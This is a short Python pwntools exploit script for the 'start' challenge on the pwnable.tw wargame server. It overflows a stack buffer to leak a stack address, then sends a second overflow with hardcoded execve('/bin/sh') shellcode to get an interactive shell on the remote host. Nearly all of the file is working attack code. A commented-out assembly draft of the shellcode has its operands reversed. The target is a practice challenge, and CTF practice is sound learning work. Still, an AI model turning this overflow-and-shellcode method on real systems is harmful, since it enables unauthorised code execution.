#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./start',checksec=False)
context.arch = 'i386'
#p = process()
p = remote('chall.pwnable.tw', 10000)


#shellcode2 = asm('''
#                 xor eax,eax
#                 push eax
#                 push 0x68732f2f
#                 push 0x6e69622f
#                 mov esp,ebx
#                 mov eax,ecx
#                 mov eax,edx
#                 mov 0xb,al
#                 int 0x80
#                 xor eax,eax
#                 inc eax
#                 int 0x80
#                 ''')
shellcode =  b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
payload = b'a'*20 + p32(0x08048087)
input()
p.sendafter(b"Let's start the CTF:",payload)
leak = u32(p.recv(4))
target = leak + 20
log.info(f'target: {hex(target)}')
input()
payload2 = b'a'*0x14 + p32(target) + shellcode
print(len(payload2))
p.send(payload2)

p.interactive()
